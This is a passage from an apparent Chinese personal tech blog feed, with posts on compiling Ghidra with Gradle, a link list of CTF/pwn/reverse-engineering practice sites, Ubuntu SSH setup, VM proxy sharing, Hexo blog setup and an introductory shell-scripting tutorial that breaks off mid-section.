<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">java --version</span></span><br><span class="line">openjdk 17.0.7 2023-04-18</span><br><span class="line">OpenJDK Runtime Environment (build 17.0.7+7-Ubuntu-0ubuntu118.04)</span><br><span class="line">OpenJDK 64-Bit Server VM (build 17.0.7+7-Ubuntu-0ubuntu118.04, mixed mode, sharing)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">javac --version</span></span><br><span class="line">javac 17.0.7</span><br></pre></td></tr></table></figure>

<p>这里环境变量似乎是已经自动配置好了，不用再自己配置了。</p>
<h2 id="安装-Gradle"><a href="#安装-Gradle" class="headerlink" title="安装 Gradle"></a>安装 Gradle</h2><p>Gradle下载地址：<a href="https://gradle.org/releases/">https://gradle.org/releases/</a></p>
<p>根据官网指示安装：<a href="https://docs.gradle.org/8.4/userguide/installation.html#ex-installing-manually">https://docs.gradle.org/8.4/userguide/installation.html#ex-installing-manually</a></p>
<p>注：这里虽然说的是7.3+版本，最好用较新的，我一开始用7.3.3版本并没有编译成功。</p>
<p>Gradle需要java环境，JDK 8 以上均可。</p>
<p>安装步骤如下：</p>
<ol>
<li><p>下载 binary-only zip 文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://downloads.gradle.org/distributions/gradle-8.4-bin.zip</span><br></pre></td></tr></table></figure>
</li>
<li><p>解压</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> /opt/gradle</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">unzip -d /opt/gradle gradle-8.4-bin.zip</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> /opt/gradle/gradle-8.4</span></span><br><span class="line">LICENSE  NOTICE  bin  README  init.d  lib  media</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置环境变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:/opt/gradle/gradle-8.4/bin</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export GRADLE_HOME=/opt/gradle/gradle-8.4</span><br><span class="line">export PATH=$&#123;GRADLE_HOME&#125;/bin:$&#123;PATH&#125;</span><br></pre></td></tr></table></figure>

<p>两种方式均可，<code>export</code> 是临时配置，可把这条命令加入 <code>.bashrc</code> 中</p>
</li>
<li><p>检查是否安装成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gradle -v</span></span><br><span class="line"></span><br><span class="line">------------------------------------------------------------</span><br><span class="line">Gradle 8.4</span><br><span class="line">------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Build time:   2023-10-04 20:52:13 UTC</span><br><span class="line">Revision:     e9251e572c9bd1d01e503a0dfdf43aedaeecdc3f</span><br><span class="line"></span><br><span class="line">Kotlin:       1.9.10</span><br><span class="line">Groovy:       3.0.17</span><br><span class="line">Ant:          Apache Ant(TM) version 1.10.13 compiled on January 4 2023</span><br><span class="line">JVM:          17.0.7 (Private Build 17.0.7+7-Ubuntu-0ubuntu118.04)</span><br><span class="line">OS:           Linux 4.15.0-212-generic amd64</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="编译安装-Ghidra"><a href="#编译安装-Ghidra" class="headerlink" title="编译安装 Ghidra"></a>编译安装 Ghidra</h2><p>步骤如下：</p>
<ol>
<li><p>从 GitHub 下载 ghidra 源码</p>
</li>
<li><p>解压</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">unzip ghidra-master</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ghidra-master</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在 ghidra 目录下执行以下命令安装依赖</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gradle -I gradle/support/fetchDependencies.gradle init</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装好依赖后，执行以下命令开始编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gradle buildGhidra</span><br></pre></td></tr></table></figure>

<p>编译过程可能会有部分报错，但能正常编译，并且也似乎不影响Ghidra正常使用（迷惑），编译完成后，可以在Ghidra源代码目录下找到build文件夹，该文件夹下的dist文件夹中会生成编译好的Ghidra压缩包，执行以下命令，解压压缩包：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unzip ./build/dist/ghidra_10.5_DEV_20231009_linux_x86_64.zip</span><br></pre></td></tr></table></figure>
</li>
<li><p>切换到解压后的目录中，运行 ghidra</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ./build/dist/ghidra_10.5_DEV</span><br><span class="line">./ghidraRun</span><br></pre></td></tr></table></figure>

<p>即可启动编译好的Ghidra使用了</p>
</li>
</ol>
<h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><p><a href="https://blog.csdn.net/weixin_43437392/article/details/117389655">https://blog.csdn.net/weixin_43437392/article/details/117389655</a></p>
]]></content>
  </entry>
  <entry>
    <title>PWN&amp;RE学习网站整理</title>
    <url>/2023/03/15/PWN-RE%E5%AD%A6%E4%B9%A0%E7%BD%91%E7%AB%99%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p>浅浅记录一下平时搜集到的一些网站</p>
<span id="more"></span>

<h2 id="CTF平台"><a href="#CTF平台" class="headerlink" title="CTF平台"></a>CTF平台</h2><ol>
<li><p><a href="https://zaratec.io/ctf-practice/">https://zaratec.io/ctf-practice/</a></p>
<p>国外某个大佬总结的ctf的练习资源网站，下面列举的网站有些也包含在这个里边</p>
</li>
<li><p><a href="https://ctftime.org/">https://ctftime.org/</a></p>
<p>国外CTF赛事日程表</p>
</li>
<li><p>CTF-all-in-one<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/">https://firmianay.gitbooks.io/ctf-all-in-one/content/</a></p>
<p>西电整理的CTF相关的系统性知识，各个方面都有，包含一些二进制分析工具的使用</p>
</li>
<li><p>合天网安：<a href="https://tools.hetianlab.com/">https://tools.hetianlab.com/</a></p>
<p>合天网安的一个实验平台，但是要钱，emmm，感觉看看就好。</p>
</li>
<li><p>CTF wiki：<a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p>
<p>简直是万物起源！！！</p>
</li>
<li><p><a href="https://www.bilibili.com/video/BV1854y1y7Ro/?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1854y1y7Ro/?spm_id_from=333.337.search-card.all.click</a></p>
<p>一个基于ctfwiki讲解的pwn入门教程，看评论评价挺好的</p>
</li>
</ol>
<h2 id="PWN做题练习网站"><a href="#PWN做题练习网站" class="headerlink" title="PWN做题练习网站"></a>PWN做题练习网站</h2><ol>
<li><p>ROP技术练习：<a href="https://ropemporium.com/index.html">https://ropemporium.com/index.html</a></p>
<p>里面有不同类型的挑战习题来掌握不同的ROP姿势</p>
</li>
<li><p>PWN.colloge:<a href="https://pwn.college/">https://pwn.college/</a></p>
<p>pwn.colloge比较出名的pwn入门学习资源网站，在youtube跟Twitch上有直播讲解。</p>
</li>
<li><p><a href="https://pwnable.tw/">https://pwnable.tw/</a></p>
<p>老牌的pwn做题网站</p>
</li>
<li><p><a href="https://pwnable.kr/">https://pwnable.kr/</a></p>
<p>同上</p>
</li>
<li><p>Nightmare：<a href="https://guyinatuxedo.github.io/index.html">https://guyinatuxedo.github.io/index.html</a></p>
<p>一个比较有名的gitbook，以例题的形式来讲解各种漏洞</p>
</li>
<li><p>Wargames：<a href="https://overthewire.org/wargames/">https://overthewire.org/wargames/</a></p>
<p>也是一个比较出名的联系网站，包含linux基础命令，也有pwn、逆向和密码学等相关练习</p>
</li>
<li><p><a href="https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html">https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html</a></p>
<p>一个在线计算缓冲区溢出偏移的网站，感觉不如cyclic好用，主要是有点不方便</p>
</li>
<li><p><a href="https://docs.pwntools.com/en/stable/index.html">https://docs.pwntools.com/en/stable/index.html</a></p>
<p>pwntools的官网文档（emm，还是先看别人的博客吧）</p>
</li>
<li><p>CS6265实验室：<a href="https://tc.gts3.org/cs6265/2019/tut/tut01-warmup1.html">https://tc.gts3.org/cs6265/2019/tut/tut01-warmup1.html</a></p>
<p>CS6265实验室写的比较系统的二进制安全教程，基本涵盖了常见的所有方面内容。</p>
</li>
<li><p><a href="https://pwnhub.cn/index">https://pwnhub.cn/index</a></p>
<p>长亭的一个pwn练习网站，但是注册要邀请码，格局小了</p>
</li>
<li><p><a href="https://libc.blukat.me/">https://libc.blukat.me/</a></p>
<p>在线查找libc版本的网站</p>
</li>
<li><p><a href="https://www.yuque.com/cyberangel/rg9gdm">https://www.yuque.com/cyberangel/rg9gdm</a></p>
<p>pwn群里一个大佬整理的知识库（有一些是ctfwiki上的内容）</p>
</li>
<li><p>蒸米：一步一步学ROP</p>
<p><a href="https://segmentfault.com/a/1190000005888964">https://segmentfault.com/a/1190000005888964</a></p>
<p><a href="https://segmentfault.com/a/1190000007406442?utm_source=sf-similar-article">https://segmentfault.com/a/1190000007406442?utm_source=sf-similar-article</a></p>
</li>
</ol>
<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><ol>
<li><p>Arm处理器：<a href="https://azeria-labs.com/">https://azeria-labs.com/</a></p>
<p>一个关于arm架构的逆向和其他漏洞学习网站</p>
</li>
<li><p><a href="http://reversing.kr/">http://reversing.kr/</a></p>
<p>老牌的逆向做题网站</p>
</li>
<li><p><a href="https://www.bookstack.cn/read/reverse-engineering-for-beginners-zh/README.md">https://www.bookstack.cn/read/reverse-engineering-for-beginners-zh/README.md</a></p>
<p>在线版的RE4B</p>
</li>
<li><p>非常出名的滴水逆向三期：(但是有点老了)</p>
<p><a href="https://www.bilibili.com/video/BV1w54y1y7Di/?spm_id_from=333.337.search-card.all.click&vd_source=a53efc064df022698f188d04686d6ae5">https://www.bilibili.com/video/BV1w54y1y7Di/?spm_id_from=333.337.search-card.all.click&amp;vd_source=a53efc064df022698f188d04686d6ae5</a></p>
</li>
<li></li>
</ol>
<p>一篇关于符号执行技术的博客：</p>
<p><a href="https://www.k0rz3n.com/2019/02/28/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF/">https://www.k0rz3n.com/2019/02/28/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF/</a></p>
<p>一篇关于污点分析技术的博客：</p>
<p><a href="https://www.k0rz3n.com/2019/03/01/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/">https://www.k0rz3n.com/2019/03/01/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/</a></p>
<h2 id="UP主"><a href="#UP主" class="headerlink" title="UP主"></a>UP主</h2><p>B站：<a href="https://space.bilibili.com/97139894?spm_id_from=333.337.0.0">逆风微笑的代码狗</a></p>
<p>会时不时从Youtube搬运一些比较不错的安全相关的视频</p>
<h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2>]]></content>
  </entry>
  <entry>
    <title>Ubuntu安装SSH</title>
    <url>/2023/09/13/Ubuntu%E5%AE%89%E8%A3%85SSH/</url>
    <content><![CDATA[<h1 id="Ubunut-安装-SSH-服务"><a href="#Ubunut-安装-SSH-服务" class="headerlink" title="Ubunut 安装 SSH 服务"></a>Ubunut 安装 SSH 服务</h1><h2 id="1-安装所需要的包"><a href="#1-安装所需要的包" class="headerlink" title="1. 安装所需要的包"></a>1. 安装所需要的包</h2><p>运行 SSH 服务器的包由 OpensSSH 的 <code>openssh-server</code> 组件提供：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt upgrade</span><br><span class="line">sudo apt install openssh-server</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="2-检查服务器状态"><a href="#2-检查服务器状态" class="headerlink" title="2. 检查服务器状态"></a>2. 检查服务器状态</h2><p>当你下载并安装完包后，SSH 服务器应该已经运行了，但是为了确保万无一失我们需要检查一下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">service ssh status</span></span><br><span class="line">● ssh.service - OpenBSD Secure Shell server</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enab</span><br><span class="line">   Active: active (running) since Wed 2023-09-13 07:33:52 PDT; 2min 27s ago</span><br><span class="line">  Process: 4467 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)</span><br><span class="line"> Main PID: 4470 (sshd)</span><br><span class="line">    Tasks: 1</span><br><span class="line">   Memory: 1.5M</span><br><span class="line">      CPU: 8ms</span><br><span class="line">   CGroup: /system.slice/ssh.service</span><br><span class="line">           └─4470 /usr/sbin/sshd -D</span><br><span class="line">lines 1-10/10 (END)</span><br></pre></td></tr></table></figure>

<p>其中 <code>active</code> 是高亮的。输入 <code>q</code> 退出该页面。</p>
<p>还可以使用 <code>systemctl</code> 命令：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo systemctl status ssh</span><br></pre></td></tr></table></figure>

<p>如果 SSH 服务没有运行，使用这个命令运行它：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable --now ssh</span><br></pre></td></tr></table></figure>

<h2 id="3-允许-SSH-通过防火墙"><a href="#3-允许-SSH-通过防火墙" class="headerlink" title="3. 允许 SSH 通过防火墙"></a>3. 允许 SSH 通过防火墙</h2><p>Ubuntu 带有名为 <a href="https://link.zhihu.com/?target=https://itsfoss.com/set-up-firewall-gufw/">UFW</a>（*简单的防火墙(Uncomplicated Firewall)*）的防火墙，这是管理网络规则的 <code>iptables</code> 的一个接口。如果启动了防火墙，它可能会阻止你连接服务器。</p>
<p>想要配置 UFW 允许你的接入，你需要运行如下命令：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo ufw allow ssh</span><br></pre></td></tr></table></figure>

<p>UFW 的运行状态可以通过运行 <code>sudo ufw status</code> 来检查。</p>
<p>现在，我们的 SSH 服务器已经开始运行了，在等待来自客户端的连接。</p>
<h2 id="连接远程服务器"><a href="#连接远程服务器" class="headerlink" title="连接远程服务器"></a>连接远程服务器</h2><p>你本地的 Linux 系统已经安装了 SSH 客户端。如果没有，你可以在 Ubuntu 中使用如下命令安装：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo apt install openssh-client</span><br></pre></td></tr></table></figure>

<p>要连接你的 Ubuntu 系统，你需要知道它的 IP 地址，然后使用 <code>ssh</code> 命令，就像这样：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ssh username@address</span><br></pre></td></tr></table></figure>

<p>将 <strong>用户名</strong>（<code>username</code>）改为你的系统上的实际用户名，并将 <strong>地址</strong>（<code>address</code>）改为你服务器的 IP 地址。</p>
<p>如果你 <a href="https://link.zhihu.com/?target=https://itsfoss.com/check-ip-address-ubuntu/">不知道 IP 地址</a>，可以在服务器的终端输入 <code>ip a</code> 查看结果</p>
<h2 id="关闭-SSH-连接"><a href="#关闭-SSH-连接" class="headerlink" title="关闭 SSH 连接"></a>关闭 SSH 连接</h2><p>只需要输入 <code>exit</code> 即可关闭连接，会立马关闭不需要确认。</p>
<h2 id="在-Ubuntu-中关闭并禁止-SSH"><a href="#在-Ubuntu-中关闭并禁止-SSH" class="headerlink" title="在 Ubuntu 中关闭并禁止 SSH"></a>在 Ubuntu 中关闭并禁止 SSH</h2><p>如果你想要停止 SSH 服务，需要运行该命令：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo systemctl stop ssh</span><br></pre></td></tr></table></figure>

<p>该命令会关闭 SSH 服务，直到重启它或者系统重启。想要重启它，输入：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo systemctl start ssh</span><br></pre></td></tr></table></figure>

<p>现在，如果你想要禁止 SSH 跟随系统启动，使用该命令：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo systemctl disable ssh</span><br></pre></td></tr></table></figure>

<p>该命令不会停止当前的 SSH 会话，只会在启动的时候生效。如果你想要它跟随系统启动，输入：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable ssh</span><br></pre></td></tr></table></figure>

<h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/577082732">https://zhuanlan.zhihu.com/p/577082732</a></p>
<p><a href="https://itsfoss.com/set-up-ssh-ubuntu/">https://itsfoss.com/set-up-ssh-ubuntu/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
  </entry>
  <entry>
    <title>Ubuntu虚拟机共享主机VPN</title>
    <url>/2022/08/17/Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%85%B1%E4%BA%AB%E4%B8%BB%E6%9C%BAVPN/</url>
    <content><![CDATA[<p>工作环境：VMware16、Ubuntu16.04（客户机）、Win10（主机）和Clash for Windows。</p>
<p>VMware中虚拟机的网络设置选为NAT模式，步骤如下：</p>
<ol>
<li><p>将win10中clash打开Allow LAN选项，并查看代理端口（此处为：7890）</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817191543525.png" alt="image-20220817191543525"></p>
</li>
<li><p>在Win10（主机）终端中执行<code>ipconfig</code>命令，查看VMware Network Adapter VMnet8的IPv4地址（此处为：192.160.220.1）</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817191819717.png" alt="image-20220817191819717"></p>
</li>
<li><p>在Ubuntu16.04（客户机）中设置网络代理，路径为：系统设置-&gt;网络-&gt;网络代理，填写刚才查看的VMnet8的ipv4地址和代理端口号</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817192048712.png" alt="image-20220817192048712"></p>
</li>
<li><p>应用到整个系统</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
  </entry>
  <entry>
    <title>hexo静态博客搭建</title>
    <url>/2023/05/03/hexo%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="hexo静态博客搭建"><a href="#hexo静态博客搭建" class="headerlink" title="hexo静态博客搭建"></a>hexo静态博客搭建</h1><p>五一假期给老电脑硬件升下级，换了个1T的固态硬盘+原有的1T机械，嗯，感觉还能再苟两年。顺手重装了下系统，环境啥的都要重新安装，正好重新做个记录。</p>
<span id="more"></span>

<h2 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1. 安装Git"></a>1. 安装Git</h2><p>参考链接：<a href="https://blog.csdn.net/mukes/article/details/115693833">https://blog.csdn.net/mukes/article/details/115693833</a></p>
<h2 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2. 安装Node.js"></a>2. 安装Node.js</h2><p>参考链接：<a href="https://blog.csdn.net/weixin_44893902/article/details/121788104">https://blog.csdn.net/weixin_44893902/article/details/121788104</a></p>
<p><a href="https://blog.csdn.net/weixin_52799373/article/details/123840137">https://blog.csdn.net/weixin_52799373/article/details/123840137</a></p>
<p><a href="https://blog.csdn.net/qq_42006801/article/details/124830995">https://blog.csdn.net/qq_42006801/article/details/124830995</a></p>
<p>结合着看</p>
<h2 id="3-安装hexo"><a href="#3-安装hexo" class="headerlink" title="3. 安装hexo"></a>3. 安装hexo</h2><h2 id="4-GitHub创建个人仓库"><a href="#4-GitHub创建个人仓库" class="headerlink" title="4. GitHub创建个人仓库"></a>4. GitHub创建个人仓库</h2><h2 id="5-生成SSH添加到GitHub"><a href="#5-生成SSH添加到GitHub" class="headerlink" title="5. 生成SSH添加到GitHub"></a>5. 生成SSH添加到GitHub</h2><h2 id="6-将hexo部署到GitHub"><a href="#6-将hexo部署到GitHub" class="headerlink" title="6. 将hexo部署到GitHub"></a>6. 将hexo部署到GitHub</h2><h2 id="7-设置个人域名"><a href="#7-设置个人域名" class="headerlink" title="7. 设置个人域名"></a>7. 设置个人域名</h2><h2 id="8-发布文章"><a href="#8-发布文章" class="headerlink" title="8. 发布文章"></a>8. 发布文章</h2><p>以上步骤参考该链接：<a href="https://zhuanlan.zhihu.com/p/44213627%EF%BC%8C%E4%B8%94%E8%AF%A5%E9%93%BE%E6%8E%A5%E4%B8%AD%E8%BF%98%E5%8C%85%E5%90%AB%E4%BA%86%E6%9B%B4%E6%8D%A2%E7%94%B5%E8%84%91%E6%97%B6%E7%9A%84%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C%E3%80%82">https://zhuanlan.zhihu.com/p/44213627，且该链接中还包含了更换电脑时的相关操作。</a></p>
<p><strong>注意：</strong>电脑重装系统会导致文件所有者变更，Win10中git仓库会出现下面错误</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230503234828517.png" alt="image-20230503234828517"></p>
<p>出现上面的错误可参考该链接修改文件的所有者：<a href="https://blog.csdn.net/weixin_52954097/article/details/128875480">https://blog.csdn.net/weixin_52954097/article/details/128875480</a></p>
<p>或B站视频教程：<a href="https://www.bilibili.com/video/BV1Yb411a7ty/">https://www.bilibili.com/video/BV1Yb411a7ty/</a></p>
]]></content>
  </entry>
  <entry>
    <title>shell脚本基础入门学习</title>
    <url>/2023/04/17/shell%E8%84%9A%E6%9C%AC%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Shell-脚本"><a href="#Shell-脚本" class="headerlink" title="Shell 脚本"></a>Shell 脚本</h1><p><strong>参考书籍：</strong><a href="https://akaedu.github.io/book/ch31s01.html">《Linux C一站式编程》</a></p>
<p>注：由于书比较老，部分内容可能已过时。</p>
<h2 id="1-Shell-的历史"><a href="#1-Shell-的历史" class="headerlink" title="1. Shell 的历史"></a>1. Shell 的历史</h2><p>Shell 的作用是解释执行用户的命令，用户输入一条命令，Shell就解释执行一条，这种方式称为交互式（Interactive），Shell还有一种执行命令的方式称为批处理（Batch），用户事先写一个Shell脚本（Script），其中有很多条命令，让Shell一次把这些命令执行完，而不必一条一条地敲命令。Shell脚本和编程语言很相似，也有变量和流程控制语句，但Shell脚本是解释执行的，不需要编译，Shell程序从脚本中一行一行读取并执行这些命令，相当于一个用户把脚本中的命令一行一行敲到Shell提示符下执行。</p>
<span id="more"></span>

<p>由于历史原因，UNIX系统上有很多种Shell：</p>
<ol>
<li><code>sh</code>（Bourne Shell）：由Steve Bourne开发，各种UNIX系统都配有<code>sh</code>。</li>
<li><code>csh</code>（C Shell）：由Bill Joy开发，随BSD UNIX发布，它的流程控制语句很像C语言，支持很多Bourne Shell所不支持的功能：作业控制，命令历史，命令行编辑。</li>
<li><code>ksh</code>（Korn Shell）：由David Korn开发，向后兼容<code>sh</code>的功能，并且添加了<code>csh</code>引入的新功能，是目前很多UNIX系统标准配置的Shell，在这些系统上<code>/bin/sh</code>往往是指向<code>/bin/ksh</code>的符号链接（现在应该已经不是了）。</li>
<li><code>tcsh</code>（TENEX C Shell）：是<code>csh</code>的增强版本，引入了命令补全等功能，在FreeBSD、Mac OS X等系统上替代了<code>csh</code>。</li>
<li><code>bash</code>（Bourne Again Shell）：由GNU开发的Shell，主要目标是与POSIX标准保持一致，同时兼顾对<code>sh</code>的兼容，<code>bash</code>从<code>csh</code>和<code>ksh</code>借鉴了很多功能，是各种Linux发行版标准配置的Shell，在Linux系统上<code>/bin/sh</code>往往是指向<code>/bin/bash</code>的符号链接[<a href="#1">1</a>]。虽然如此，<code>bash</code>和<code>sh</code>还是有很多不同的，一方面，<code>bash</code>扩展了一些命令和参数，另一方面，<code>bash</code>并不完全和<code>sh</code>兼容，有些行为并不一致，所以<code>bash</code>需要模拟<code>sh</code>的行为：当我们通过<code>sh</code>这个程序名启动<code>bash</code>时，<code>bash</code>可以假装自己是<code>sh</code>，不认扩展的命令，并且行为与<code>sh</code>保持一致。</li>
</ol>
<p><strong>补充：</strong>现在有<code>zsh</code>，<code>zsh</code>（或 ZShell ）是Unix shell的一种，是Bourne shell（<code>sh</code>）的扩展版本。它包括<code>bash</code>（另一种流行的shell）的许多功能，但也具有许多增强和改进。<code>zsh</code>具有强大的命令行完成系统、拼写纠正和许多其他高级功能。</p>
<p>文件<code>/etc/shells</code>给出了系统中所有已知（不一定已安装）的Shell，除了上面提到的Shell之外还有很多变种。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/shells</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/shells: valid login shells</span></span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/rbash</span><br><span class="line">/bin/dash</span><br><span class="line">/usr/bin/dash</span><br><span class="line">/bin/bash-static</span><br><span class="line">/usr/bin/bash-static</span><br></pre></td></tr></table></figure>

<p>用户的默认Shell设置在<code>/etc/passwd</code>文件中，以我的账户为例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/passwd | grep guoxb</span></span><br><span class="line">guoxb:x:1000:1000:guoxb,,,:/home/guoxb:/bin/bash</span><br></pre></td></tr></table></figure>

<p>用户从字符终端登录或者打开图形终端窗口时就会自动执行<code>/bin/bash</code>。如果要切换到其他Shell，可以在命令行输入程序名，例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">sh（在bash提示符下输入sh命令）</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">（出现sh的提示符）</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">（按Ctrl-d或者输入<span class="built_in">exit</span>命令）</span></span><br><span class="line"><span class="meta prompt_">~$</span><span class="language-bash">（回到bash提示符）</span></span><br><span class="line"><span class="meta prompt_">~$</span><span class="language-bash">（再次按Ctrl-d或者输入<span class="built_in">exit</span>命令会退出登录或者关闭图形终端窗口）</span></span><br></pre></td></tr></table></figure>

<p>本文只介绍<code>bash</code>和<code>sh</code>的用法和相关语法，不介绍其他Shell（基本用法和语法是相似的）。所以下文提到的Shell都是指<code>bash</code>或<code>sh</code>。</p>
<p><a name="1">[1]</a>：最新的发行版有一些变化，例如我现在使用的 Ubuntu 20.04 的<code>/bin/sh</code>是指向<code>/bin/dash</code>的符号链接，<code>dash</code>也是一种类似<code>bash</code>的shell。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -al /bin/sh /bin/dash</span></span><br><span class="line">-rwxr-xr-x 1 root root 129816 Jul 19  2019 /bin/dash</span><br><span class="line">lrwxrwxrwx 1 root root      4 Mar 17 10:37 /bin/sh -&gt; dash</span><br></pre></td></tr></table></figure>



<h2 id="2-Shell-如何执行命令"><a href="#2-Shell-如何执行命令" class="headerlink" title="2. Shell 如何执行命令"></a>2. Shell 如何执行命令</h2><h3 id="2-1-执行交互式命令"><a href="#2-1-执行交互式命令" class="headerlink" title="2.1 执行交互式命令"></a>2.1 执行交互式命令</h3><p>用户在命令行输入命令后，一般情况下Shell会<code>fork</code>并<code>exec</code>该命令，但是Shell的内建命令例外，执行内建命令相当于调用Shell进程中的一个函数，并不创建新的进程。像<code>cd</code> 、<code>alias</code>、<code>umask</code>、<code>exit</code>等命令即是内建命令，凡是用<code>which</code>命令查不到程序文件所在位置的命令都是内建命令，内建命令没有单独的man手册，要在man手册中查看内建命令，应该使用以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">man bash-builtins</span></span><br></pre></td></tr></table></figure>

<p>本节会介绍很多内建命令，如<code>export</code>、<code>shift</code>、<code>if</code>、<code>eval</code>、<code>[</code>、<code>for</code>、<code>while</code>等等。内建命令虽然不创建新的进程，但也会有Exit Status，通常也用 0 表示成功非零表示失败，虽然内建命令不创建新的进程，但执行结束后也会有一个状态码，也可以用特殊变量<code>$?</code>读出。</p>
<h3 id="2-2-执行脚本"><a href="#2-2-执行脚本" class="headerlink" title="2.2 执行脚本"></a>2.2 执行脚本</h3><p>首先编写一个简单的脚本，保存为<code>script.sh</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p>Shell 脚本中用<code>#</code>表示注释，相当于C语言的<code>//</code>注释。但如果<code>#</code>位于第一行开头，并且是<code>#！</code>（称为Shebang[<a href="#shebang">2</a>]）则例外，他表示该脚本使用后面指定的解释器<code>/bin/sh</code>解释执行。如果把这个脚本文件加上可执行权限然后执行：</p>
